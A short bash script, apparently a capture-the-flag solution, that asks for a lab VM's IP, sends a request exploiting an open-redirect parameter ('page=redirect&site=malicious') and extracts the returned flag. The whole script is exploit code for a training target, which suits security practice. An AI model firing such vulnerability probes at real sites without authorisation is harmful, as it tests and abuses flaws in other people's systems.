#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/?page=redirect&site=malicious"

response=$(curl -s "$url" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"